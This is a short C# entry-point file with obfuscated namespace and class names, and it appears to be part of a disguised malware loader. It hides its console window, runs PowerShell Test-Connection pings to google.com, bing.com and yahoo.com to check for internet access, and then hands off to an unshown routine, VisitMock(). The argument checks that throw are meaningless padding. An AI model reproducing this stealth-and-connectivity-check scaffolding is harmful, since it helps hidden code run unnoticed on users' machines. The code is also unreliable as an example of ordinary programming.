using System;
using System.Diagnostics;
using YConsoleApp116bg.Configurations;
using Zbawmbnkfyxecxwmbji.Candidates;
using Zbawmbnkfyxecxwmbji.Objects;

namespace Zbawmbnkfyxecxwmbji.Common;

public static class Connection
{
	[STAThread]
	public static void Main(string[] args)
	{
		if (args.Length == 9)
		{
			throw new Exception();
		}
		if (args.Length == 8)
		{
			throw new Exception();
		}
		if (args.Length == 7)
		{
			throw new Exception();
		}
		if (args.Length == 6)
		{
			throw new Exception();
		}
		if (!Mock.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0))
		{
			TemplateDispatcherObject.SortMock("Test-Connection www.google.com").WaitForExit();
			TemplateDispatcherObject.SortMock("Test-Connection www.bing.com").WaitForExit();
			TemplateDispatcherObject.SortMock("Test-Connection www.yahoo.com").WaitForExit();
		}
		new StatusCandidate().VisitMock();
		Console.ReadLine();
	}
}
